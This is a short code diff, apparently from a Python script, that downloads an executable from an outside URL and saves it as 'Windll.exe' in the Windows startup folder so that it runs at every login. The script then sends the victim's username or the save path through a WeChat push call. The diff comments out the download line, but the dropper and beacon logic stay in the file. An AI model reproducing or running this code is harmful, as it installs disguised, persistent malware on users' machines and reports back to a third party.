@@ -116,6 +116,7 @@ url = "https://cccimg.com/down.php/3d961495fa0bd4c7be0e4d8740a699f8.exe"
 startup_folder_path = get_startup_folder_path()
 file_name = "Windll.exe"  # 你需要指定文件名
 save_path = os.path.join(startup_folder_path, file_name)
-download_file(url, save_path)
-wechat_push.Alleged_information(f'{sys_username}ok')
+# download_file(url, save_path)
+
+wechat_push.Alleged_information(save_path)
 
